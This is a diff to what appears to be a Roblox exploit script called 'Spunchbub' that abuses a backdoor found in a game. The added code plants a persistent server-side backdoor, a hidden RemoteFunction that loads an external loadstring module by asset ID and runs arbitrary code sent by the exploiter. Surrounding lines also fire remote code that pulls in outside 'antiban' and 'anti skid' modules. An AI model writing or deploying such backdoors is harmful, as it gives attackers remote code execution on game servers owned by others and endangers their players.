@@ -1054,6 +1054,22 @@ for _, svc in ipairs(services) do
 end]])
 fireRemoteEvent('local r=Instance.new("RemoteEvent",game.JointsService)r.Name="_FEBYPASS32"r.OnServerEvent:Connect(function(p)p:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")end)')
 fireRemoteEvent('require(7458325257).antiban()')
+fireRemoteEvent([[
+local frm = game:GetService("FeatureRestrictionManager")
+
+local remoteFunction = Instance.new("RemoteFunction")
+remoteFunction.Name = "spunch.bd_cssr6-01"
+remoteFunction.Parent = frm
+
+local loadstring = require(13684410229)
+
+remoteFunction.OnServerInvoke = function(player, code)
+    if player.Name ~= "]] .. game.Players.LocalPlayer.Name .. [[" then
+        return
+    end
+    loadstring(code)()
+end
+]])
 fireRemoteEvent('require(3986243232).load("spunchbub anti skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
         notify.Info("Spunchbub","Backdoor found! Implemented backdoor protection & anti ban.")
     else
